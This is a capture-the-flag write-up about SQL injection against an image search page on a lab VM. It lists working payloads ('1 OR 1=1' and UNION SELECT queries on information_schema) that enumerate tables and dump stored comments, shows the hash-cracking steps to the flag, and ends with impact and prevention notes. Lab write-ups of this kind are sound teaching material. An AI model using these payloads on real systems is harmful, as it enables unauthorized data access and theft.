# SQL Injection - Image Search

SQL injection is a type of injection attack. Injection attacks occur when maliciously crafted inputs 
are submitted by an attacker, causing an application to perform an unintended action.


## Breach

Go to page:

{VM_IP}/index.php?page=searchimg

Insert the following commands into the image search bar:

### Test if vulnerable to SQL Injection

```1 OR 1=1```

We get all the results because every row is considered true.

### Get the table names in the database

```1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.TABLES```

Here we find:

* Title: list_images
* Url : Member_images

### Find table columns in the database for each table

```1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS```

Here find the following table structure:

* Table name: list_images,
column : id
* Table name: list_images,
column : url
* Table name: list_images,
column : title
* Table name: list_images,
column : comment

### Look at the comment below each member's image

```1 OR 1=1 UNION SELECT title, comment FROM Member_images.list_images```

Here we find:

* Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
* Url : Hack me ?

### Hash

[md5_decrypt](https://md5decrypt.net)(1928e8083cf461a51303633093573c46) = albatroz

[sha256](https://md5decrypt.net/Sha256)(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

flag = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


## Use

A successful SQL injection attack can:
- read sensitive data from the database, 
- modify database data (insert/update/delete), 
- execute administration operations on the database (such as shutdown the DBMS), 
- recover the content of a given file existing on the DBMS file system or write files into the file system, 
- in some cases, issue commands to the operating system.


## Prevention

- You should always use parameterized statements where available, 
they are your number one protection against SQL injection.
- [Here](https://www.hacksplaining.com/prevention/sql-injection#code-samples) are some code samples in various languages.
- Principle of Least Privilege: applications should ensure that each process or software component can access and affect only the resources it needs. 
Apply “levels of clearance” as appropriate.
